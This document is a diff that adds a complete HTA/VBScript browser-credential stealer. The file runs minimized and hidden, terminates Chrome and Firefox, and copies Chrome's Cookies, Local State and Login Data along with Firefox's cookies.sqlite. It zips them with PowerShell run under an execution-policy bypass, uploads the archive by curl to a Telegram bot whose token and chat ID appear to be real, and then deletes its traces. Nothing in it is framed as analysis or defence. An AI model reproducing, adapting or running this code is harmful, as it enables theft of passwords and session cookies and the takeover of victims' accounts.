@@ -1,0 +1,275 @@
+<hta:application id="oHTA"
+    applicationname="CopyZipSendToTelegram"
+    windowstate="minimize"
+    border="none"
+    showintaskbar="no"
+    singleinstance="yes"
+    innerborder="no"
+    maximizebutton="no"
+    minimizebutton="no"
+    sysmenu="no"
+    caption="no" />
+
+<script language="VBScript">
+    Sub Window_OnLoad
+        ' Call the function to kill Chrome and Firefox sessions
+        KillChromeProcesses
+        KillFirefoxProcesses
+
+        ' Add a 3-second delay using ping command
+        WaitForDelay 3
+
+        ' Call the function to copy Chrome files
+        CopyChromeFiles
+
+        ' Call the function to copy Firefox cookies
+        CopyFirefoxCookies
+
+        ' Add a 3-second delay using ping command
+        WaitForDelay 3
+
+        ' Call the function to zip the copied files
+        ZipChromeFiles
+
+        ' Add a 3-second delay using ping command
+        WaitForDelay 3
+
+        ' Call the function to send the zip file to Telegram
+        SendZipToTelegram
+
+        ' Add a 3-second delay using ping command
+        WaitForDelay 3
+
+        ' Delete ChromeFiles folder and ChromeFiles.zip file
+        DeleteChromeFiles
+
+        ' Close the HTA window
+        window.Close
+    End Sub
+    
+    Sub KillChromeProcesses()
+        ' Kill all Chrome processes
+        Dim objWMIService, colProcess, objProcess
+        Dim processesFound
+        processesFound = False
+
+        On Error Resume Next
+        Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+        If Err.Number <> 0 Then
+            Exit Sub
+        End If
+
+        Set colProcess = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE Name='chrome.exe'")
+        If Err.Number <> 0 Then
+            Exit Sub
+        End If
+        
+        For Each objProcess In colProcess
+            objProcess.Terminate()
+            If Err.Number = 0 Then
+                processesFound = True
+            End If
+        Next
+
+        On Error GoTo 0
+    End Sub
+
+    Sub KillFirefoxProcesses()
+        ' Kill all Firefox processes
+        Dim objWMIService, colProcess, objProcess
+        Dim processesFound
+        processesFound = False
+
+        On Error Resume Next
+        Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+        If Err.Number <> 0 Then
+            Exit Sub
+        End If
+
+        Set colProcess = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE Name='firefox.exe'")
+        If Err.Number <> 0 Then
+            Exit Sub
+        End If
+        
+        For Each objProcess In colProcess
+            objProcess.Terminate()
+            If Err.Number = 0 Then
+                processesFound = True
+            End If
+        Next
+
+        On Error GoTo 0
+    End Sub
+
+    Sub CopyChromeFiles()
+        On Error Resume Next
+
+        Dim fso, desktopPath, chromeFolder
+        Dim sourceCookiesPath, destCookiesPath
+        Dim sourceLocalStatePath, destLocalStatePath
+        Dim sourceLoginDataPath, destLoginDataPath
+
+        Set fso = CreateObject("Scripting.FileSystemObject")
+        desktopPath = CreateObject("WScript.Shell").SpecialFolders("Desktop")
+
+        ' Create a folder named "ChromeFiles" on the desktop if it doesn't exist
+        chromeFolder = desktopPath & "\ChromeFiles"
+        If Not fso.FolderExists(chromeFolder) Then
+            fso.CreateFolder(chromeFolder)
+        End If
+
+        ' Set source and destination paths using environment variables
+        sourceCookiesPath = ExpandEnvironmentStrings("%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies")
+        destCookiesPath = chromeFolder & "\Cookies"
+
+        sourceLocalStatePath = ExpandEnvironmentStrings("%LOCALAPPDATA%\Google\Chrome\User Data\Local State")
+        destLocalStatePath = chromeFolder & "\Local State"
+
+        sourceLoginDataPath = ExpandEnvironmentStrings("%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data")
+        destLoginDataPath = chromeFolder & "\Login Data"
+
+        ' Copy files to the ChromeFiles folder on desktop
+        fso.CopyFile sourceCookiesPath, destCookiesPath, True
+        fso.CopyFile sourceLocalStatePath, destLocalStatePath, True
+        fso.CopyFile sourceLoginDataPath, destLoginDataPath, True
+
+        Set fso = Nothing
+        On Error GoTo 0
+    End Sub
+
+    Sub CopyFirefoxCookies()
+        On Error Resume Next
+
+        Dim profilePath, cookieDBPath, tempCookieDBPath, desktopPath, chromeFolder
+
+        ' Set paths
+        profilePath = GetFirefoxProfilePath()
+        cookieDBPath = profilePath & "\cookies.sqlite"
+        desktopPath = CreateObject("WScript.Shell").SpecialFolders("Desktop")
+        chromeFolder = desktopPath & "\ChromeFiles"
+
+        ' Copy the cookies.sqlite file to the ChromeFiles folder
+        CreateObject("Scripting.FileSystemObject").CopyFile cookieDBPath, chromeFolder & "\FirefoxCookies.sqlite", True
+
+        On Error GoTo 0
+    End Sub
+
+    Sub ZipChromeFiles()
+        On Error Resume Next
+
+        Dim zipScriptPath, shell, desktopPath, chromeFolder, zipFilePath, logFilePath
+        zipScriptPath = "zipScript.ps1"
+        logFilePath = "zipLog.txt"
+        Set shell = CreateObject("WScript.Shell")
+        desktopPath = CreateObject("WScript.Shell").SpecialFolders("Desktop")
+        chromeFolder = desktopPath & "\ChromeFiles"
+        zipFilePath = desktopPath & "\ChromeFiles.zip"
+
+        ' Create PowerShell script to zip the folder
+        Dim zipScript
+        zipScript = "Compress-Archive -Path '" & chromeFolder & "' -DestinationPath '" & zipFilePath & "' -Force"
+
+        ' Write the script to a .ps1 file
+        Dim fso, zipScriptFile
+        Set fso = CreateObject("Scripting.FileSystemObject")
+        Set zipScriptFile = fso.CreateTextFile(zipScriptPath, True)
+        zipScriptFile.WriteLine(zipScript)
+        zipScriptFile.Close
+
+        ' Execute the PowerShell script and log the output
+        shell.Run "powershell -executionpolicy bypass -File " & zipScriptPath & " > " & logFilePath & " 2>&1", 0, True
+
+        ' Delete the PowerShell script file
+        fso.DeleteFile(zipScriptPath)
+
+        ' Delete the log file
+        fso.DeleteFile(logFilePath)
+
+        Set fso = Nothing
+        On Error GoTo 0
+    End Sub
+
+    Sub SendZipToTelegram()
+        On Error Resume Next
+
+        Dim strBotToken, strChatID, strZipFilePath
+        Dim curlCommand
+
+        ' Telegram bot token (replace with your actual bot token)
+        strBotToken = "7372575086:AAFSogrc0dZeP3POnNKIreZB4PmUb03Wn0c"
+
+        ' Chat ID (replace with the chat ID where you want to send the file)
+        strChatID = "6548118191"
+
+        ' Path to the zip file you want to send
+        strZipFilePath = CreateObject("WScript.Shell").SpecialFolders("Desktop") & "\ChromeFiles.zip"
+
+        ' Build the curl command to send the zip file to Telegram
+        curlCommand = "curl -X POST -H ""Content-Type:multipart/form-data"" -F document=@" & Chr(34) & strZipFilePath & Chr(34) & " ""https://api.telegram.org/bot" & strBotToken & "/sendDocument?chat_id=" & strChatID & """"
+
+        ' Create a shell object
+        Dim objShell
+        Set objShell = CreateObject("WScript.Shell")
+
+        ' Execute the curl command
+        objShell.Run curlCommand, 0, True
+
+        Set objShell = Nothing
+        On Error GoTo 0
+    End Sub
+
+    Sub DeleteChromeFiles()
+        On Error Resume Next
+
+        Dim fso, desktopPath, chromeFolder, zipFilePath
+        Set fso = CreateObject("Scripting.FileSystemObject")
+        desktopPath = CreateObject("WScript.Shell").SpecialFolders("Desktop")
+        chromeFolder = desktopPath & "\ChromeFiles"
+        zipFilePath = desktopPath & "\ChromeFiles.zip"
+
+        ' Delete ChromeFiles folder
+        If fso.FolderExists(chromeFolder) Then
+            fso.DeleteFolder chromeFolder, True
+        End If
+
+        ' Delete ChromeFiles.zip file
+        If fso.FileExists(zipFilePath) Then
+            fso.DeleteFile zipFilePath, True
+        End If
+
+        Set fso = Nothing
+        On Error GoTo 0
+    End Sub
+
+    Sub WaitForDelay(seconds)
+        Dim wshShell, waitCommand
+        Set wshShell = CreateObject("WScript.Shell")
+        waitCommand = "ping -n " & seconds + 1 & " 127.0.0.1 > nul"
+        wshShell.Run waitCommand, 0, True
+    End Sub
+
+    Function ExpandEnvironmentStrings(str)
+        ExpandEnvironmentStrings = CreateObject("WScript.Shell").ExpandEnvironmentStrings(str)
+    End Function
+
+    Function GetFirefoxProfilePath()
+        Dim profilesPath, fso, folder, subfolder, profilePath
+        profilesPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%APPDATA%") & "\Mozilla\Firefox\Profiles"
+        Set fso = CreateObject("Scripting.FileSystemObject")
+        Set folder = fso.GetFolder(profilesPath)
+
+        ' Find the default profile matching the regex pattern ".default-release"
+        For Each subfolder In folder.SubFolders
+            If InStr(subfolder.Name, ".default-release") > 0 Then
+                profilePath = subfolder.Path
+                Exit For
+            End If
+        Next
+
+        If profilePath = "" Then
+            window.close
+        End If
+
+        GetFirefoxProfilePath = profilePath
+    End Function
+</script>
